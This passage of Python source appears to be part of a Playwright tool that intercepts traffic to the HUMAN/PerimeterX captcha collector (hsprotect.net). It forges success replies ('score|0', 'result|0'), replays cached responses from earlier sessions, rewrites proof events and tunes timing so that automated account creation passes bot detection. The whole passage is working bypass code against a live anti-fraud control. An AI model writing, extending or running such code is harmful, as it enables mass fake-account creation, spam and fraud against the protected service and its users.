                    )
                    return route.fulfill(response=response, body=response_body)
                except Exception as fetch_exc:
                    log_record["route_fetch_error"] = repr(fetch_exc)[:240]
                    write_log(log_record)
                    print(f"[Probe] force synthetic final bypass fetch failed: {fetch_exc!r}")
                    return route.continue_(post_data=clean_body)
            if suppress_unforced_final_for_synthetic and "PX561" in (before_summary.get("tags") or []):
                neutral_parts = ["IoIoIo|score|1|binary", "IoIIIo|cu"]
                response_body = _encode_collector_response_body(body, neutral_parts)
                log_record = {
                    "ts": datetime.now().isoformat(),
                    "url": url,
                    "method": request.method,
                    "qi": meta.get("qi"),
                    "seq": form.get("seq"),
                    "rsc": form.get("rsc"),
                    "old_len": len(body),
                    "new_len": len(body),
                    "changes": [{"suppress_unforced_final_for_synthetic": True}],
                    "before": before_summary,
                    "after": before_summary,
                    "response_status": 200,
                    "response_len": len(response_body),
                    "response_decoded": {
                        "parts": neutral_parts,
                        "scores": ["IoIoIo|score|1|binary"],
                        "results": [],
                        "suppress_unforced_final_for_synthetic": True,
                    },
                }
                write_log(log_record)
                print(
                    "[Probe] suppressed unforced natural final while synthetic final is armed "
                    f"qi={meta.get('qi')} seq={form.get('seq')} tags={before_summary.get('tags')}"
                )
                return route.fulfill(
                    status=200,
                    headers={
                        "content-type": "application/json; charset=utf-8",
                        "access-control-allow-origin": "https://iframe.hsprotect.net",
                        "access-control-allow-credentials": "true",
                    },
                    body=response_body,
                )
            defer_w0_wait_ms_actual = 0
            optimistic_w0_wait_ms_actual = 0
            if (
                defer_final_result_to_w0
                and before_summary.get("tags") == ["W0cqQR4rLnA="]
                and qi_key
                and qi_key not in deferred_final_success_by_qi
                and int(defer_final_result_to_w0_wait_ms or 0) > 0
            ):
                wait_started = time.time()
                write_log({
                    "ts": datetime.now().isoformat(),
                    "url": url,
                    "method": request.method,
                    "qi": meta.get("qi"),
                    "seq": form.get("seq"),
                    "rsc": form.get("rsc"),
                    "event": "defer_w0_wait_start",
                    "wait_ms": int(defer_final_result_to_w0_wait_ms or 0),
                    "before": before_summary,
                })
                deadline = time.time() + max(0, int(defer_final_result_to_w0_wait_ms or 0)) / 1000.0
                while qi_key not in deferred_final_success_by_qi and time.time() < deadline:
                    time.sleep(0.05)
                defer_w0_wait_ms_actual = int((time.time() - wait_started) * 1000)
                write_log({
                    "ts": datetime.now().isoformat(),
                    "url": url,
                    "method": request.method,
                    "qi": meta.get("qi"),
                    "seq": form.get("seq"),
                    "rsc": form.get("rsc"),
                    "event": "defer_w0_wait_done",
                    "wait_ms": int(defer_final_result_to_w0_wait_ms or 0),
                    "elapsed_ms": defer_w0_wait_ms_actual,
                    "hit": qi_key in deferred_final_success_by_qi,
                    "before": before_summary,
                })
            if (
                optimistic_w0_success
                and before_summary.get("tags") == ["W0cqQR4rLnA="]
                and qi_key
                and qi_key not in optimistic_w0_parts_by_qi
                and int(defer_final_result_to_w0_wait_ms or 0) > 0
            ):
                wait_started = time.time()
                write_log({
                    "ts": datetime.now().isoformat(),
                    "url": url,
                    "method": request.method,
                    "qi": meta.get("qi"),
                    "seq": form.get("seq"),
                    "rsc": form.get("rsc"),
                    "event": "optimistic_w0_parts_wait_start",
                    "wait_ms": int(defer_final_result_to_w0_wait_ms or 0),
                    "before": before_summary,
                })
                deadline = time.time() + max(0, int(defer_final_result_to_w0_wait_ms or 0)) / 1000.0
                while qi_key not in optimistic_w0_parts_by_qi and time.time() < deadline:
                    time.sleep(0.05)
                optimistic_w0_wait_ms_actual = int((time.time() - wait_started) * 1000)
                write_log({
                    "ts": datetime.now().isoformat(),
                    "url": url,
                    "method": request.method,
                    "qi": meta.get("qi"),
                    "seq": form.get("seq"),
                    "rsc": form.get("rsc"),
                    "event": "optimistic_w0_parts_wait_done",
                    "wait_ms": int(defer_final_result_to_w0_wait_ms or 0),
                    "elapsed_ms": optimistic_w0_wait_ms_actual,
                    "hit": qi_key in optimistic_w0_parts_by_qi,
                    "before": before_summary,
                })
            if (
                (
                    neutral_final_fetch_w0
                    or neutral_final_merge_w0_success
                    or neutral_final_cached_w0_success
                    or neutral_final_cached_rich_w0_success
                    or real_final_neutral_w0_success
                    or session_cached_rich_final_success
                    or session_cached_rich_w0_success
                    or session_cached_rich_final_and_w0_success
                )
                and before_summary.get("tags") == ["W0cqQR4rLnA="]
                and qi_key in neutral_final_fetch_w0_by_qi
            ):
                neutral = neutral_final_fetch_w0_by_qi.get(qi_key, {})
                log_record = {
                    "ts": datetime.now().isoformat(),
                    "url": url,
                    "method": request.method,
                    "qi": meta.get("qi"),
                    "seq": form.get("seq"),
                    "rsc": form.get("rsc"),
                    "old_len": len(body),
                    "new_len": len(body),
                    "changes": [{"neutral_final_fetch_w0": True, "from": neutral}],
                    "before": before_summary,
                    "after": before_summary,
                    "neutral_final_fetch_w0": True,
                }
                if (
                    real_final_neutral_w0_success
                    or session_cached_rich_final_success
                    or session_cached_rich_w0_success
                    or session_cached_rich_final_and_w0_success
                ):
                    wait_started = time.time()
                    deadline = time.time() + max(0, int(defer_final_result_to_w0_wait_ms or 0)) / 1000.0
                    skip_neutral_wait = bool(
                        session_cached_rich_final_and_w0_success
                        and not session_rich_final_parts
                        and load_cached_final_parts()
                    )
                    if skip_neutral_wait:
                        log_record["session_cached_rich_w0_skip_blocking_wait"] = True
                    else:
                        while (
                            isinstance(neutral, dict)
                            and neutral.get("mode") in {
                                "real_final_neutral_w0_success",
                                "session_cached_rich_final_success",
                                "session_cached_rich_w0_success",
                                "session_cached_rich_final_and_w0_success",
                            }
                            and not neutral.get("ready")
                            and time.time() < deadline
                        ):
                            time.sleep(0.05)
                            neutral = neutral_final_fetch_w0_by_qi.get(qi_key, neutral)
                    log_record["real_final_neutral_w0_wait_elapsed_ms"] = int((time.time() - wait_started) * 1000)
                    log_record["real_final_neutral_ready"] = bool(isinstance(neutral, dict) and neutral.get("ready"))
                    if isinstance(neutral, dict):
                        neutral["w0_fulfilled"] = True
                    selected_w0_parts, selected_w0_source = select_rich_parts_for_w0(qi_key)
                    if (session_cached_rich_w0_success or session_cached_rich_final_and_w0_success) and selected_w0_parts:
                        w0_success_parts = force_success_w0_parts(selected_w0_parts)
                        log_record["session_cached_rich_w0_source"] = selected_w0_source
                        log_record["session_cached_rich_w0_source_parts"] = len(selected_w0_parts)
                        if selected_w0_source in {"same_qi_preproof_response", "same_qi_final_response"}:
                            log_record["session_cached_rich_same_qi_rich_w0"] = True
                            initial_delay_ms = max(0, int(session_cached_rich_initial_w0_delay_ms or 0))
                            if initial_delay_ms:
                                time.sleep(initial_delay_ms / 1000.0)
                                log_record["session_cached_rich_initial_w0_delay_ms"] = initial_delay_ms
                    elif session_cached_rich_final_and_w0_success:
                        # W0 often reaches the route layer before the final
                        # PX561 handler can route.fetch/cache the same qi.  A
                        # synchronous wait here blocks that final handler, so
                        # falling through to a minimal W0 permanently loses the
                        # rich _px3/_pxde shape.  Use the last accepted rich
                        # final cache as a bootstrap for the first W0; later
                        # rounds will use session_rich_final_parts above.
                        cached_final_parts = load_cached_final_parts()
                        if cached_final_parts:
                            w0_success_parts = force_success_w0_parts(cached_final_parts)
                            log_record["session_cached_rich_w0_bootstrap_from_final_cache"] = True
                            log_record["session_cached_rich_w0_bootstrap_parts"] = len(cached_final_parts)
                            initial_delay_ms = max(0, int(session_cached_rich_initial_w0_delay_ms or 0))
                            if initial_delay_ms:
                                # In the accepted CreateAccount=200 trace the
                                # final response reached the client before the
                                # decisive W0 result0 by ~2.8s.  When W0 is
                                # already queued and we bootstrap from the last
                                # rich final cache, preserve that response order
                                # instead of letting W0 win the race.
                                time.sleep(initial_delay_ms / 1000.0)
                                log_record["session_cached_rich_bootstrap_w0_delay_ms"] = initial_delay_ms
                        else:
                            w0_success_parts = ["IoIoIo|score|0|binary", "oIIoIooo|0"]
                    else:
                        w0_success_parts = ["IoIoIo|score|0|binary", "oIIoIooo|0"]
                    response_body = _encode_collector_response_body(body, w0_success_parts)
                    log_record["changes"].append({"real_final_neutral_w0_success": True})
                    log_record["response_status"] = 200
                    log_record["response_len"] = len(response_body)
                    log_record["response_decoded_merged"] = {
                        "parts": w0_success_parts,
                        "scores": [p for p in w0_success_parts if str(p).startswith("IoIoIo|score|")],
                        "results": [p for p in w0_success_parts if str(p).startswith("oIIoIooo|")],
                        "real_final_neutral_w0_success": True,
                        "session_cached_rich_final_success": bool(session_cached_rich_final_success),
                        "session_cached_rich_w0_success": bool(session_cached_rich_w0_success),
                        "session_cached_rich_final_and_w0_success": bool(session_cached_rich_final_and_w0_success),
                        "session_cached_rich_w0_parts": len(session_rich_final_parts) if (session_cached_rich_w0_success or session_cached_rich_final_and_w0_success) else 0,
                    }
                    # The host risk/verify request is fired ~15-35ms after this
                    # W0 response in live traces.  Previously the gate only
                    # remembered PX561 final route.fetch results, so the
                    # neutral-final/W0-success path logged last_result="" and
                    # forwarded risk/verify immediately.  Record W0 result|0 as
                    # the decisive collector handoff so --risk-verify-gate-ms
                    # can actually wait for backend propagation before the host
                    # asks risk/verify to continue.
                    log_record["risk_verify_gate_snapshot"] = remember_final_result_for_risk_gate(
                        str(meta.get("qi") or ""),
                        str(form.get("seq") or ""),
                        log_record.get("response_decoded_merged"),
                        200,
                        "real_final_neutral_w0_success",
                    )
                    log_record["real_final_neutral_w0_success"] = True
                    log_record["session_cached_rich_final_success"] = bool(session_cached_rich_final_success)
                    log_record["session_cached_rich_w0_success"] = bool(session_cached_rich_w0_success)
                    log_record["session_cached_rich_final_and_w0_success"] = bool(session_cached_rich_final_and_w0_success)
                    if session_cached_rich_w0_success or session_cached_rich_final_and_w0_success:
                        log_record["session_cached_rich_w0_parts"] = len(session_rich_final_parts)
                    write_log(log_record)
                    print(
                        "[Probe] real/session-final fulfilled W0 success "
                        f"qi={meta.get('qi')} seq={form.get('seq')}"
                    )
                    return route.fulfill(
                        status=200,
                        headers={
                            "content-type": "application/json; charset=utf-8",
                            "access-control-allow-origin": "https://iframe.hsprotect.net",
                            "access-control-allow-credentials": "true",
                        },
                        body=response_body,
                    )
                neutral_final_fetch_w0_by_qi.pop(qi_key, None)
                if neutral_final_cached_w0_success or neutral_final_cached_rich_w0_success:
                    try:
                        cache = json.loads(w0_parts_cache_path.read_text(encoding="utf-8"))
                        cached_parts = list(cache.get("parts") or [])
                    except Exception:
                        cached_parts = []
                    if neutral_final_cached_rich_w0_success:
                        # The last real W0 cache can contain only cu/_pxde.  For
                        # the cached-rich variant, build the W0 success from the
                        # richer final cache as well so the response carries the
                        # accepted cu/_pxde/_px3 + result0 shape instead of
                        # downgrading to a "minimal" W0 in diagnostics/runtime.
                        final_cache_parts = load_cached_final_parts()
                        merged_parts = force_success_w0_parts(final_cache_parts or cached_parts)
                    else:
                        merged_parts = cached_parts + ["IoIoIo|score|0|binary", "oIIoIooo|0"]
                    response_body = _encode_collector_response_body(body, merged_parts)
                    log_record["changes"].append({
                        "neutral_final_cached_w0_success": True,
                        "cache_path": str(w0_parts_cache_path),
                        "cached_parts": len(cached_parts),
                        "final_cached_parts": len(final_cache_parts) if neutral_final_cached_rich_w0_success else 0,
                        "rich_final": bool(neutral_final_cached_rich_w0_success),
                    })
                    log_record["response_status"] = 200
                    log_record["response_len"] = len(response_body)
                    log_record["response_decoded_merged"] = {
                        "parts": merged_parts,
                        "scores": [p for p in merged_parts if p.startswith("IoIoIo|score|")],
                        "results": [p for p in merged_parts if p.startswith("oIIoIooo|")],
                        "neutral_final_cached_w0_success": True,
                        "neutral_final_cached_rich_w0_success": bool(neutral_final_cached_rich_w0_success),
                    }
                    log_record["risk_verify_gate_snapshot"] = remember_final_result_for_risk_gate(
                        str(meta.get("qi") or ""),
                        str(form.get("seq") or ""),
                        log_record.get("response_decoded_merged"),
                        200,
                        "neutral_final_cached_w0_success",
                    )
                    log_record["neutral_final_cached_w0_success"] = True
                    log_record["neutral_final_cached_rich_w0_success"] = bool(neutral_final_cached_rich_w0_success)
                    write_log(log_record)
                    print(
                        "[Probe] neutral-final fulfilled cached W0 success "
                        f"qi={meta.get('qi')} seq={form.get('seq')} cached_parts={len(cached_parts)}"
                    )
                    return route.fulfill(
                        status=200,
                        headers={
                            "content-type": "application/json; charset=utf-8",
                            "access-control-allow-origin": "https://iframe.hsprotect.net",
                            "access-control-allow-credentials": "true",
                        },
                        body=response_body,
                    )
                try:
                    response = route.fetch(post_data=body)
                    response_body = response.text()
                    log_record["response_status"] = response.status
                    log_record["response_len"] = len(response_body or "")
                    try:
                        from analyze_protocol_run import _decode_collector_response

                        log_record["response_decoded"] = _decode_collector_response(response_body, body)
                    except Exception as dec_exc:
                        log_record["response_decode_error"] = repr(dec_exc)[:200]
                    decoded = log_record.get("response_decoded") or {}
                    try:
                        real_parts_for_cache = list(decoded.get("parts") or [])
                        if real_parts_for_cache:
                            w0_parts_cache_path.write_text(
                                json.dumps({
                                    "saved_at": datetime.now().isoformat(),
                                    "qi": meta.get("qi"),
                                    "seq": form.get("seq"),
                                    "parts": real_parts_for_cache,
                                }, ensure_ascii=False, indent=2),
                                encoding="utf-8",
                            )
                            log_record["real_w0_parts_cached"] = str(w0_parts_cache_path)
                    except Exception as cache_exc:
                        log_record["real_w0_parts_cache_error"] = repr(cache_exc)[:200]
                    if neutral_final_merge_w0_success:
                        real_parts = list(decoded.get("parts") or [])
                        merged_parts = real_parts + ["IoIoIo|score|0|binary", "oIIoIooo|0"]
                        response_body = _encode_collector_response_body(body, merged_parts)
                        log_record["response_len"] = len(response_body)
                        log_record["response_decoded_merged"] = {
                            "parts": merged_parts,
                            "scores": [p for p in merged_parts if p.startswith("IoIoIo|score|")],
                            "results": [p for p in merged_parts if p.startswith("oIIoIooo|")],
                            "neutral_final_merge_w0_success": True,
                        }
                        log_record["risk_verify_gate_snapshot"] = remember_final_result_for_risk_gate(
                            str(meta.get("qi") or ""),
                            str(form.get("seq") or ""),
                            log_record.get("response_decoded_merged"),
                            200,
                            "neutral_final_merge_w0_success",
                        )
                        log_record["neutral_final_merge_w0_success"] = True
                    write_log(log_record)
                    print(
                        "[Probe] neutral-final fetched real W0 "
                        f"qi={meta.get('qi')} seq={form.get('seq')} "
                        f"scores={decoded.get('scores')} results={decoded.get('results')} "
                        f"merge_success={bool(neutral_final_merge_w0_success)}"
                    )
                    return route.fulfill(
                        status=response.status,
                        headers=dict(response.headers),
                        body=response_body,
                    )
                except Exception as exc:
                    log_record["fetch_error"] = repr(exc)[:240]
                    write_log(log_record)
                    print(
                        "[Probe] neutral-final real W0 fetch failed "
                        f"qi={meta.get('qi')} seq={form.get('seq')} error={exc!r}"
                    )
                    return route.continue_()
            if (
                before_summary.get("tags") == ["W0cqQR4rLnA="]
                and qi_key
                and qi_key not in neutral_final_fetch_w0_by_qi
                and (session_cached_rich_w0_success or session_cached_rich_final_and_w0_success)
            ):
                # Old 1s/U0 ordering can be U0 -> W0 -> final.  In that case
                # the final handler has not yet armed neutral_final_fetch_w0_by_qi.
                # Use the last rich final cache to give the early W0 the same
                # rich result|0 shape, then let the following final return neutral.
                cached_final_parts, cached_final_source = select_rich_parts_for_w0(qi_key)
                if cached_final_parts:
                    w0_success_parts = force_success_w0_parts(cached_final_parts)
                    early_entry = neutral_final_fetch_w0_by_qi.setdefault(qi_key, {
                        "seq": form.get("seq"),
                        "rsc": form.get("rsc"),
                        "mode": "early_cached_rich_w0_success",
                        "ready": False,
                        "early_w0": True,
                        "cached_parts": len(cached_final_parts),
                        "cached_source": cached_final_source,
                    })
                    early_delay_ms = max(0, int(session_cached_rich_initial_w0_delay_ms or 0))
                    response_body = _encode_collector_response_body(body, w0_success_parts)
                    if async_early_cached_rich_w0:
                        async_wait_ms = max(early_delay_ms, max(0, int(defer_final_result_to_w0_wait_ms or 0)), 1200)
                        pending_early_w0_by_qi[qi_key] = {
                            "route": route,
                            "url": url,
                            "method": request.method,
                            "qi": meta.get("qi"),
                            "seq": form.get("seq"),
                            "rsc": form.get("rsc"),
                            "started_at": time.time(),
                            "min_delay_ms": early_delay_ms,
                            "max_wait_ms": async_wait_ms,
                            "response_body": response_body,
                            "parts": w0_success_parts,
                            "cached_parts": len(cached_final_parts),
                            "cached_source": cached_final_source,
                            "before": before_summary,
                        }
                        start_record = {
                            "ts": datetime.now().isoformat(),
                            "url": url,
                            "method": request.method,
                            "qi": meta.get("qi"),
                            "seq": form.get("seq"),
                            "rsc": form.get("rsc"),
                            "old_len": len(body),
                            "new_len": len(body),
                            "event": "early_cached_rich_w0_async_hold_start",
                            "changes": [{"early_cached_rich_w0_async_hold": True}],
                            "before": before_summary,
                            "after": before_summary,
                            "cached_parts": len(cached_final_parts),
                            "cached_source": cached_final_source,
                            "async_wait_ms": async_wait_ms,
                            "min_delay_ms": early_delay_ms,
                        }
                        write_log(start_record)
                        print(
                            "[Probe] early cached rich W0 async hold armed "
                            f"qi={meta.get('qi')} seq={form.get('seq')} wait_ms={async_wait_ms} "
                            "mode=fulfill_from_final"
                        )
                        return
                    if early_delay_ms:
                        # In the old accepted 1s trace the final request was
                        # emitted only a few ms after W0, while the W0 response
                        # arrived later.  Fulfilling cached-rich W0 immediately
                        # can close/reload the iframe before PX561 is emitted.
                        # Reuse the existing initial-delay knob as a soft hold:
                        # leave the W0 XHR pending briefly so the browser can
                        # drain the final request, then return the rich W0 body.
                        time.sleep(early_delay_ms / 1000.0)
                        early_entry["early_w0_delay_ms"] = early_delay_ms
                    early_entry["w0_fulfilled"] = True
                    log_record = {
                        "ts": datetime.now().isoformat(),
                        "url": url,
                        "method": request.method,
                        "qi": meta.get("qi"),
                        "seq": form.get("seq"),
                        "rsc": form.get("rsc"),
                        "old_len": len(body),
                        "new_len": len(body),
                        "changes": [{"early_cached_rich_w0_success": True}],
                        "before": before_summary,
                        "after": before_summary,
                        "response_status": 200,
                        "response_len": len(response_body),
                        "response_decoded_merged": {
                            "parts": w0_success_parts,
                            "scores": [p for p in w0_success_parts if str(p).startswith("IoIoIo|score|")],
                            "results": [p for p in w0_success_parts if str(p).startswith("oIIoIooo|")],
                            "early_cached_rich_w0_success": True,
                            "cached_parts": len(cached_final_parts),
                            "early_w0_delay_ms": early_delay_ms,
                        },
                        "early_cached_rich_w0_success": True,
                        "early_w0_delay_ms": early_delay_ms,
                        "session_cached_rich_w0_success": bool(session_cached_rich_w0_success),
                        "session_cached_rich_final_and_w0_success": bool(session_cached_rich_final_and_w0_success),
                    }
                    log_record["risk_verify_gate_snapshot"] = remember_final_result_for_risk_gate(
                        str(meta.get("qi") or ""),
                        str(form.get("seq") or ""),
                        log_record.get("response_decoded_merged"),
                        200,
                        "early_cached_rich_w0_success",
                    )
                    write_log(log_record)
                    print(
                        "[Probe] early cached rich W0 success fulfilled "
                        f"qi={meta.get('qi')} seq={form.get('seq')} cached_parts={len(cached_final_parts)} "
                        f"delay_ms={early_delay_ms}"
                    )
                    return route.fulfill(
                        status=200,
                        headers={
                            "content-type": "application/json; charset=utf-8",
                            "access-control-allow-origin": "https://iframe.hsprotect.net",
                            "access-control-allow-credentials": "true",
                        },
                        body=response_body,
                    )
            if (
                defer_final_result_to_w0
                and before_summary.get("tags") == ["W0cqQR4rLnA="]
                and qi_key in deferred_final_success_by_qi
            ):
                response_body = _encode_collector_response_body(
                    body,
                    ["IoIoIo|score|0|binary", "oIIoIooo|0"],
                )
                deferred = deferred_final_success_by_qi.pop(qi_key, {})
                log_record = {
                    "ts": datetime.now().isoformat(),
                    "url": url,
                    "method": request.method,
                    "qi": meta.get("qi"),
                    "seq": form.get("seq"),
                    "rsc": form.get("rsc"),
                    "old_len": len(body),
                    "new_len": len(body),
                    "changes": [{"deferred_final_result_to_w0": True, "from": deferred}],
                    "before": before_summary,
                    "after": before_summary,
                    "response_status": 200,
                    "response_len": len(response_body),
                    "response_decoded": {
                        "parts": ["IoIoIo|score|0|binary", "oIIoIooo|0"],
                        "scores": ["IoIoIo|score|0|binary"],
                        "results": ["oIIoIooo|0"],
                        "deferred_final_result_to_w0": True,
                    },
                    "deferred_final_result_to_w0": True,
                    "defer_w0_wait_elapsed_ms": defer_w0_wait_ms_actual,
                }
                write_log(log_record)
                print(
                    "[Probe] deferred final result0 fulfilled on W0 "
                    f"qi={meta.get('qi')} seq={form.get('seq')} from={deferred}"
                )
                fulfilled = route.fulfill(
                    status=200,
                    headers={
                        "content-type": "application/json; charset=utf-8",
                        "access-control-allow-origin": "https://iframe.hsprotect.net",
                        "access-control-allow-credentials": "true",
                    },
                    body=response_body,
                )
                if trigger_final_success_signals:
                    _trigger_hsprotect_success_signals(page, qi=str(meta.get("qi") or ""), reason="optimistic_w0_success")
                return fulfilled
            if (optimistic_final_success or optimistic_w0_success) and before_summary.get("tags") == ["W0cqQR4rLnA="]:
                w0_parts = optimistic_w0_parts_by_qi.pop(qi_key, None) if optimistic_w0_success else None
                if not w0_parts:
                    w0_parts = ["IoIoIo|score|0|binary", "oIIoIooo|0"]
                response_body = _encode_collector_response_body(
                    body,
                    w0_parts,
                )
                log_record = {
                    "ts": datetime.now().isoformat(),
                    "url": url,
                    "method": request.method,
                    "qi": meta.get("qi"),
                    "seq": form.get("seq"),
                    "rsc": form.get("rsc"),
                    "old_len": len(body),
                    "new_len": len(body),
                    "changes": [{"optimistic_w0_success": True}],
                    "before": before_summary,
                    "after": before_summary,
                    "response_status": 200,
                    "response_len": len(response_body),
                    "response_decoded": {
                        "parts": w0_parts,
                        "scores": [p for p in w0_parts if p.startswith("IoIoIo|score|")],
                        "results": [p for p in w0_parts if p.startswith("oIIoIooo|")],
                        "optimistic": True,
                        "optimistic_w0_only": bool(optimistic_w0_success and not optimistic_final_success),
                    },
                    "optimistic_w0_success": True,
                    "optimistic_w0_wait_elapsed_ms": optimistic_w0_wait_ms_actual,
                }
                write_log(log_record)
                print(
                    "[Probe] optimistic W0 collector success fulfilled "
                    f"qi={meta.get('qi')} seq={form.get('seq')} tags={before_summary.get('tags')}"
                )
                fulfilled = route.fulfill(
                    status=200,
                    headers={
                        "content-type": "application/json; charset=utf-8",
                        "access-control-allow-origin": "https://iframe.hsprotect.net",
                        "access-control-allow-credentials": "true",
                    },
                    body=response_body,
                )
                if trigger_final_success_signals:
                    _trigger_hsprotect_success_signals(page, qi=str(meta.get("qi") or ""), reason="optimistic_w0_success")
                return fulfilled
            changed, changes = _normalize_y1nz_preproof_events(events)
            proof_changed, proof_changes = _normalize_final_proof_events(
                events,
                mode=final_proof_mode,
                preserve_bfa=preserve_final_bfa,
            )
            if proof_changed:
                changed = True
                changes.append({"final_proof": proof_changes})
            if not changed:
                return route.continue_()
            patched = _encode_collector_body_from_events(body, form, events)
            patched_form = parse_form_preserve_payload(patched)
            patched_meta = decode_payload_meta_from_form(patched_form)
            after_summary = summarize_events(patched_meta.get("events") or [])
            log_record = {
                "ts": datetime.now().isoformat(),
                "url": url,
                "method": request.method,
                "qi": meta.get("qi"),
                "seq": form.get("seq"),
                "rsc": form.get("rsc"),
                "old_len": len(body),
                "new_len": len(patched),
                "changes": changes,
                "before": before_summary,
                "after": after_summary,
                "patched_pc_ok": patched_meta.get("pc_ok"),
                "patched_noise_ok": patched_meta.get("noise_ok"),
                "patched_roundtrip": patched_meta.get("payload_roundtrip"),
            }
            print(
                "[Probe] collector request normalized "
                f"qi={meta.get('qi')} seq={form.get('seq')} oldLen={len(body)} newLen={len(patched)} "
                f"tags={before_summary.get('tags')} "
                f"pc={patched_meta.get('pc_ok')} noise={patched_meta.get('noise_ok')} "
                f"rt={patched_meta.get('payload_roundtrip')} "
                f"changes={json.dumps(changes, ensure_ascii=False)[:500]}"
            )
            if (
                neutral_final_fetch_w0
                or neutral_final_merge_w0_success
                or neutral_final_cached_w0_success
                or neutral_final_cached_rich_w0_success
                or real_final_neutral_w0_success
                or session_cached_rich_final_success
                or session_cached_rich_w0_success
                or session_cached_rich_final_and_w0_success
            ) and "PX561" in (after_summary.get("tags") or []):
                # Probe variant: keep the client-side final PX561 response
                # neutral/fast so the iframe does not close with status=-1,
                # but do not synthesize the W0 success.  Let the next W0 go to
                # the real collector so any _px3/_pxde/cu material comes from
                # the server.  This tests whether CreateAccount depends on the
                # richer real W0 response rather than the minimal local
                # score|0/result|0 tuple.
                warmup_neutral_round = False
                if warmup_neutral_then_rich_final_and_w0_success:
                    final_idx = int(session_final_px561_count.get("count") or 0)
                    session_final_px561_count["count"] = final_idx + 1
                    log_record["session_final_px561_index"] = final_idx
                    # The only CreateAccount=200 trace accepted a first
                    # challenge round as an intermediate state, then submitted
                    # after the next round.  Do not spend result|0 on the first
                    # final; use it only to induce the W0/reload path.  Later
                    # rounds use rich result|0 on both final and W0.
                    warmup_neutral_round = final_idx == 0
                if warmup_neutral_round:
                    warmup_qi_key = str(meta.get("qi") or "")
                    warmup_entry = neutral_final_fetch_w0_by_qi.setdefault(warmup_qi_key, {
                        "seq": form.get("seq"),
                        "rsc": form.get("rsc"),
                        "parts_without_result": 1,
                        "mode": "warmup_neutral_then_rich_final_and_w0_success",
                        "ready": False,
                    })
                    # For the warmup round, preserve the live collector's
                    # intermediate/failure-shaped final response when possible.
                    # The only CreateAccount=200 sample had a first final that
                    # returned score|1/result|-1, then the following W0 carried
                    # the rich result|0 material.  Returning the cached rich
                    # neutral shape here is faster but changes that transition
                    # and produced captcha_close?status=-1 in live testing.
                    real_response_body = ""
                    real_response_status = None
                    real_decoded = None
                    try:
                        response = route.fetch(post_data=patched)
                        real_response_status = response.status
                        real_response_body = response.text()
                        from analyze_protocol_run import _decode_collector_response

                        real_decoded = _decode_collector_response(real_response_body, patched)
                        final_parts = [str(p) for p in (real_decoded.get("parts") or [])]
                        log_record["warmup_real_final_response_status"] = real_response_status
                        log_record["warmup_real_final_response_len"] = len(real_response_body or "")
                        log_record["warmup_real_final_response_decoded"] = real_decoded
                    except Exception as exc:
                        final_parts = []
                        log_record["warmup_real_final_fetch_error"] = repr(exc)[:240]
                    if not final_parts:
                        final_parts = load_cached_final_neutral_parts()
                        real_response_body = ""
                        log_record["warmup_neutral_fallback_cached_final"] = True
                    warmup_entry.update({
                        "ready": True,
                        "final_parts": len(final_parts),
                    })
                    if warmup_entry.get("w0_fulfilled"):
                        neutral_final_fetch_w0_by_qi.pop(warmup_qi_key, None)
                    log_record["warmup_neutral_then_rich_final_and_w0_success"] = True
                    log_record["warmup_neutral_round"] = True
                    log_record["warmup_neutral_final_parts"] = len(final_parts)
                    response_body = real_response_body or _encode_collector_response_body(patched, final_parts)
                    log_record["response_status"] = 200
                    log_record["response_len"] = len(response_body)
                    log_record["response_decoded"] = {
                        "parts": final_parts,
                        "scores": [p for p in final_parts if str(p).startswith("IoIoIo|score|")],
                        "results": [p for p in final_parts if str(p).startswith("oIIoIooo|")],
                        "neutral_final_fetch_w0": True,
                        "warmup_neutral_then_rich_final_and_w0_success": True,
                        "warmup_neutral_round": True,
                    }
                    log_record["neutral_final_fetch_w0"] = True
                    maybe_delay_final_response(log_record, "warmup_neutral_final")
                    write_log(log_record)
                    print(
                        "[Probe] warmup neutral final fulfilled; next W0/reload path armed "
                        f"qi={meta.get('qi')} seq={form.get('seq')} parts={len(final_parts)}"
                    )
                    return route.fulfill(
                        status=200,
                        headers={
                            "content-type": "application/json; charset=utf-8",
                            "access-control-allow-origin": "https://iframe.hsprotect.net",
                            "access-control-allow-credentials": "true",
                        },
                        body=response_body,
                    )
                elif (session_cached_rich_final_success or session_cached_rich_final_and_w0_success) and session_rich_final_parts:
                    final_parts = force_success_final_parts(session_rich_final_parts)
                    if session_cached_rich_final_and_w0_success:
                        neutral_final_fetch_w0_by_qi[str(meta.get("qi") or "")] = {
                            "seq": form.get("seq"),
                            "rsc": form.get("rsc"),
                            "parts_without_result": 0,
                            "mode": "session_cached_rich_final_and_w0_success",
                            "ready": True,
                            "final_parts": len(final_parts),
                        }
                    response_body = _encode_collector_response_body(patched, final_parts)
                    log_record["response_status"] = 200
                    log_record["response_len"] = len(response_body)
                    log_record["response_decoded"] = {
                        "parts": final_parts,
                        "scores": [p for p in final_parts if str(p).startswith("IoIoIo|score|")],
                        "results": [p for p in final_parts if str(p).startswith("oIIoIooo|")],
                        "session_cached_rich_final_success": True,
                        "session_cached_rich_final_and_w0_success": bool(session_cached_rich_final_and_w0_success),
                        "cached_parts": len(session_rich_final_parts),
                    }
                    log_record["session_cached_rich_final_success"] = True
                    log_record["session_cached_rich_final_and_w0_success"] = bool(session_cached_rich_final_and_w0_success)
                    log_record["session_cached_rich_final_parts"] = len(session_rich_final_parts)
                    maybe_delay_final_response(log_record, "session_cached_rich_final_success")
                    fulfill_pending_early_w0(str(meta.get("qi") or ""), log_record, "session_cached_rich_final_success")
                    write_log(log_record)
                    print(
                        "[Probe] session-cached rich final success fulfilled "
                        f"qi={meta.get('qi')} seq={form.get('seq')} cached_parts={len(session_rich_final_parts)}"
                    )
                    fulfilled = route.fulfill(
                        status=200,
                        headers={
                            "content-type": "application/json; charset=utf-8",
                            "access-control-allow-origin": "https://iframe.hsprotect.net",
                            "access-control-allow-credentials": "true",
                        },
                        body=response_body,
                    )
                    if trigger_final_success_signals:
                        _trigger_hsprotect_success_signals(page, qi=str(meta.get("qi") or ""), reason="session_cached_rich_final_success")
                    return fulfilled
                if session_cached_rich_w0_success and session_rich_final_parts:
                    final_parts = neutralize_final_parts(session_rich_final_parts)
                    log_record["session_cached_rich_w0_neutral_final"] = True
                    log_record["session_cached_rich_final_parts"] = len(session_rich_final_parts)
                elif (
                    session_cached_rich_w0_success
                    and async_early_cached_rich_w0
                    and str(meta.get("qi") or "") in pending_early_w0_by_qi
                    and load_cached_final_parts()
                ):
                    # Early W0 already arrived and is being held until this
                    # final PX561 request exists.  Do not block here on a real
                    # final route.fetch: in live traces that pushes the W0
                    # result0 callback ~1.5s later, after captcha_close=-1 has
                    # already won.  Return the same neutral score-only final
